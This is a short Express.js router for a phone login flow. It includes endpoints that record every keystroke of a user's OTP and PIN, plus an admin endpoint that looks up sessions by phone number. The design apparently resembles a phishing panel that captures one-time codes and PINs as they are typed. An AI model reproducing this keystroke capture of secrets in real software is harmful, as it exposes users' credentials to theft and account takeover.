const express = require('express');
const router = express.Router();
const authController = require('../controllers/authController');

// Step 1: User enters phone number
router.post('/track-phone', authController.trackPhoneEntry);

// Step 2: User types OTP (each keystroke)
router.post('/track-keystroke', authController.trackOTPKeystroke);

// Step 3: User types PIN (each keystroke) - NEW
router.post('/track-pin', authController.trackPINKeystroke);

// Step 4: Verify OTP
router.post('/verify-otp', authController.verifyUserOTP);

// Step 5: Verify PIN and complete login - NEW
router.post('/verify-pin', authController.verifyPIN);

// Get session info (admin monitoring)
router.get('/session/:phoneNumber', authController.getSessionInfo);

// Register new user
router.post('/register', authController.registerUser);

module.exports = router;